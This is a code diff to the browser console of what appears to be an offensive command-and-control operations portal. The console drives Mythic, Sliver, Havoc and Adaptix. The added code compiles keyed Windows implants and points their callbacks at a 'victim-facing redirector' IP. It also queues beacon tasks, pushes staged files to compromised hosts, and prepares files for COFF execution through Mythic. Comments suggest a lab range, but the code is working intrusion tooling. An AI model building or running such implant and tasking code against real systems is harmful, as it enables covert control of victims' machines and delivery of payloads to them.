@@ -532,22 +532,26 @@ async function opsLoadCatalogues() {
 function opsRenderPresets(backend) {
   const presets = document.getElementById('ops-presets');
   presets.innerHTML = '';
-  let cmds = OPS_PRESETS[backend] || OPS_PRESETS.mythic;
+  // Each preset is {cmd, label, title}: clicking fills cmd, hovering shows
+  // the help text. Catalogue entries without examples (havoc) show the bare
+  // command with its help as the tooltip.
+  let items = (OPS_PRESETS[backend] || OPS_PRESETS.mythic).map(cmd => ({
+    cmd: cmd, label: cmd, title: cmd,
+  }));
   if (opsCatalogues && opsCatalogues[backend]) {
     const cat = opsCatalogues[backend];
-    cmds = Object.entries(cat).map(([name, spec]) =>
-      spec.example ? spec.example + '  # ' + spec.help : name);
+    items = Object.entries(cat).map(([name, spec]) => ({
+      cmd: spec.example || name,
+      label: spec.example || name,
+      title: (spec.example ? spec.example + '\n' : name + '\n') + spec.help,
+    }));
   }
-  cmds.forEach(cmd => {
+  items.forEach(({cmd, label, title}) => {
     const b = document.createElement('button');
-    const shown = cmd.length > 42 ? cmd.slice(0, 42) + '…' : cmd;
-    b.textContent = shown;
-    b.title = cmd;
+    b.textContent = label.length > 42 ? label.slice(0, 42) + '…' : label;
+    b.title = title;
     b.addEventListener('click', () => {
-      // Catalogue entries carry a trailing "# help" comment for display;
-      // strip it before filling the command box.
-      document.getElementById('ops-command').value =
-        cmd.replace(/\s+#\s+.*$/, '');
+      document.getElementById('ops-command').value = cmd;
     });
     presets.appendChild(b);
   });
@@ -589,6 +593,18 @@ async function opsRunTask() {
   meta.textContent = 'tasking…';
   opsSetOutput('Sending to ' + opsSelected.backend + ' (' + opsSelected.id + ')…\n$ ' + cmd, 'busy');
 
+  // Havoc `upload <remote-path>` needs the file bytes: attach the staged
+  // file automatically when the command calls for it.
+  let upload_data_b64 = null;
+  if (opsSelected.backend === 'havoc' && /^upload\s+\S/.test(cmd)) {
+    if (!opsStagedFile) {
+      opsSetOutput('Stage a file first (Payload Builds → Stage operator file).', 'err');
+      runBtn.disabled = false;
+      meta.textContent = '';
+      return;
+    }
+    upload_data_b64 = opsStagedFile.b64;
+  }
   try {
     const res = await fetch('/api/ops/task', {
       method: 'POST',
@@ -598,6 +614,7 @@ async function opsRunTask() {
         session_id: String(opsSelected.id),
         command: cmd,
         wait: 25,
+        upload_data_b64: upload_data_b64,
       }),
     });
     const data = await res.json();
@@ -651,8 +668,17 @@ function opsShowResult(backend, data) {
     meta.textContent = 'queued (read output from the meridian results table)';
   } else if (backend === 'sliver') {
     const r = data.result || {};
-    text = r.output || (r.ok === false ? (r.raw || 'task failed') : '(no output returned)');
-    meta.textContent = 'session ' + (r.session_id || '');
+    if (r.async && r.queued) {
+      // Beacon task: queued, executes on next checkin. States poll at
+      // /api/ops/sliver/tasks?beacon_id=… (result text stays console-only).
+      text = 'Beacon task queued: ' + r.queued +
+        '\nExecutes on next checkin (~60s). States: GET /api/ops/sliver/tasks?beacon_id=' +
+        (r.session_id || '');
+      meta.textContent = 'beacon ' + (r.session_id || '') + ' (async)';
+    } else {
+      text = r.output || (r.ok === false ? (r.raw || 'task failed') : '(no output returned)');
+      meta.textContent = 'session ' + (r.session_id || '');
+    }
   } else {
     text = JSON.stringify(data, null, 2);
   }
@@ -675,7 +701,22 @@ async function opsRunBuild() {
     : 'Adaptix compiles the beacon server-side with mingw g++.\n\n')
     + 'building…';
 
+  // Victim-facing redirector IP for implant callback URLs (env-driven;
+  // falls back to the lab default if /api/status is unreachable).
+  let victimIp = '192.168.77.1';
   try {
+    const st = await fetch('/api/status');
+    if (st.ok) {
+      const sj = await st.json();
+      if (sj.victim_redirector_ip) victimIp = sj.victim_redirector_ip;
+    }
+  } catch (err) { /* keep default */ }
+
+  try {
+    if (fw === 'mythic') {
+      await opsRunMythicBuild(out, btn);
+      return;
+    }
     let url, body;
     if (fw === 'adaptix') {
       url = '/api/ops/adaptix/agent';
@@ -683,7 +724,7 @@ async function opsRunBuild() {
                format: fmt, sleep: sleep, jitter: 0 };
     } else if (fw === 'sliver') {
       url = '/api/ops/sliver/generate';
-      body = { kind: 'session', c2_url: '192.168.77.1:80/cloud/storage/objects',
+      body = { kind: 'session', c2_url: victimIp + ':80/cloud/storage/objects',
                target_os: 'windows', arch: 'amd64' };
       out.textContent = 'Sliver compiles with garble (~40s warm, minutes cold).\n\nbuilding…';
     } else {
@@ -728,6 +769,79 @@ async function opsRunBuild() {
   }
 }
 
+// Mythic/Apollo builds take minutes (dotnet), so submit returns a uuid
+// immediately and the UI polls the phase, then offers the in-portal download.
+async function opsRunMythicBuild(out, btn) {
+  const output_type = document.getElementById('build-moutput').value;
+  const debug = document.getElementById('build-mdebug').value === 'true';
+  const keying = document.getElementById('build-mkeying').value.trim();
+  const body = { output_type: output_type, debug: debug };
+  if (keying) {
+    const parts = keying.split(':');
+    if (parts.length !== 2 || !parts[0] || !parts[1]) {
+      out.className = 'ops-output build-out err';
+      out.textContent = 'Keying must look like Hostname:WS01 or Domain:CHILD.';
+      btn.disabled = false;
+      return;
+    }
+    body.enable_keying = true;
+    body.keying_method = parts[0];
+    body.keying_value = parts[1];
+  }
+  out.className = 'ops-output build-out busy';
+  out.textContent = 'Submitting Apollo ' + output_type + ' build…';
+  try {
+    const sub = await fetch('/api/ops/mythic/build', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+    const sj = await sub.json();
+    if (!sub.ok) {
+      out.className = 'ops-output build-out err';
+      out.textContent = 'Submit failed: ' + (sj.detail || sub.statusText);
+      btn.disabled = false;
+      return;
+    }
+    const uuid = sj.uuid;
+    out.textContent = 'Build queued: ' + uuid + '\ndotnet takes minutes — polling…';
+    for (let i = 0; i < 40; i++) {
+      await new Promise(r => setTimeout(r, 15000));
+      const st = await fetch('/api/ops/mythic/build/' + uuid);
+      const sj2 = await st.json();
+      if (!st.ok) {
+        out.textContent = 'Status error: ' + (sj2.detail || st.statusText);
+        break;
+      }
+      if (sj2.phase === 'success') {
+        out.className = 'ops-output build-out';
+        out.innerHTML = '';
+        out.appendChild(document.createTextNode(
+          'Apollo ' + output_type + ' built.\n'));
+        const a = document.createElement('a');
+        a.href = sj2.download_url;
+        a.textContent = '⬇ Download payload (' + uuid + ')';
+        a.className = 'btn btn-primary';
+        out.appendChild(a);
+        break;
+      }
+      if (sj2.phase === 'error') {
+        out.className = 'ops-output build-out err';
+        out.textContent = 'Build failed:\n' + (sj2.message || '') + '\n' +
+          (sj2.stderr || '').slice(-1500);
+        break;
+      }
+      out.textContent = 'Build ' + sj2.phase + '… (' + (i + 1) +
+        '/40 polls)\n' + (sj2.message || '');
+    }
+  } catch (err) {
+    out.className = 'ops-output build-out err';
+    out.textContent = 'Request failed: ' + err.message;
+  } finally {
+    btn.disabled = false;
+  }
+}
+
 function initOpsConsole() {
   // Load the tasking vocabularies in the background; preset buttons upgrade
   // to catalogue examples (with help text) once it arrives.
@@ -745,15 +859,76 @@ function initOpsConsole() {
     if (e.target.checked) opsTimer = setInterval(opsRefresh, 15000);
   });
 
-  // Havoc's builder only supports Windows Exe/Dll/Shellcode, and its sleep is
-  // an integer number of seconds rather than Adaptix's "30s" string.
+  // Per-framework build forms share one row: Havoc needs neither format nor
+  // sleep; Mythic/Apollo needs its own output/debug/keying fields instead of
+  // arch/format/sleep (arch is always x64 Windows for Apollo here).
   document.getElementById('build-fw').addEventListener('change', e => {
-    const hav = e.target.value === 'havoc';
-    document.getElementById('build-fmt-wrap').style.display = hav ? 'none' : '';
+    const fw = e.target.value;
+    const hav = fw === 'havoc';
+    const slv = fw === 'sliver';
+    const myt = fw === 'mythic';
+    document.getElementById('build-fmt-wrap').style.display =
+      (hav || myt) ? 'none' : '';
     const sleep = document.getElementById('build-sleep');
-    document.getElementById('build-sleep-wrap').style.display = hav ? 'none' : '';
+    document.getElementById('build-sleep-wrap').style.display =
+      (hav || slv || myt) ? 'none' : '';
     if (hav) sleep.value = '';
+    document.getElementById('build-arch-wrap').style.display =
+      myt ? 'none' : '';
+    for (const id of ['build-moutput-wrap', 'build-mdebug-wrap',
+                      'build-mkeying-wrap']) {
+      document.getElementById(id).style.display = myt ? '' : 'none';
+    }
   });
+  document.getElementById('stage-run').addEventListener('click', opsStageFile);
+}
+
+// Staged operator file: uploaded to Mythic once (returns agent_file_id for
+// register_coff flows) and ALSO held in memory so Havoc `upload <path>`
+// tasks can attach the bytes (upload_data_b64).
+let opsStagedFile = null;
+
+async function opsStageFile() {
+  const input = document.getElementById('stage-file');
+  const status = document.getElementById('stage-status');
+  const out = document.getElementById('build-output');
+  if (!input.files || !input.files.length) {
+    status.textContent = 'Pick a file first.';
+    return;
+  }
+  const file = input.files[0];
+  const buf = new Uint8Array(await file.arrayBuffer());
+  let b64 = '';
+  for (let i = 0; i < buf.length; i += 0x8000) {
+    b64 += String.fromCharCode.apply(null, buf.subarray(i, i + 0x8000));
+  }
+  b64 = btoa(b64);
+  opsStagedFile = { name: file.name, size: file.size, b64: b64 };
+  status.textContent = 'Staged locally: ' + file.name + ' (' + file.size +
+    ' B). Uploading to Mythic…';
+  try {
+    const fd = new FormData();
+    fd.append('file', new Blob([buf]), file.name);
+    const res = await fetch('/api/ops/mythic/upload', {
+      method: 'POST', body: fd,
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      status.textContent = 'Local only (' + file.name + '): Mythic upload failed: ' +
+        (data.detail || res.statusText);
+      return;
+    }
+    opsStagedFile.agent_file_id = data.agent_file_id;
+    status.textContent = 'Staged: ' + file.name + ' (' + file.size +
+      ' B) → Mythic agent_file_id ' + data.agent_file_id +
+      '. Use register_file with this name, then execute_coff.';
+    out.className = 'ops-output build-out';
+    out.textContent = 'Staged ' + file.name + ' in Mythic.\nagent_file_id: ' +
+      data.agent_file_id + '\nNext: register_file {"existingFile": "' +
+      file.name + '"} on a callback, then execute_coff.';
+  } catch (err) {
+    status.textContent = 'Local only (' + file.name + '): ' + err.message;
+  }
 }
 
 /* --------------------------------------------------------------------------
